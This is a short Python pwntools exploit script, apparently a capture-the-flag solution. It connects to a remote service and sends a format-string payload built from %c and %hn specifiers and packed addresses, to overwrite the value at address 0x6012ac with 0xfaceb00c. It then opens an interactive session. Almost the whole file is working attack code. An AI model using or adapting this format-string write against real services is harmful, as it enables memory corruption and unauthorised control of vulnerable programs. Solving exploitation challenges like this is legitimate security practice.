#!/usr/bin/env python
from pwn import *

#host, port = '60.251.236.18', 10129
host, port = '127.0.0.1', 7126
y = remote(host, port)

a = 0x6012ac

#raw_input('@')
#p = '%20$p.'.ljust(0x20, ) + p64(a)
#p = '%4207849484c%20$n.'.ljust(0x20, ) + p64(a)
p = '%45068c%20$hn%19138c%21$hn%.'.ljust(0x20, '\x00') + p64(a) + p64(a+2)
y.sendafter('name ?', p)

#0xfaceb00c
#0xb00c

#0xface




y.interactive()
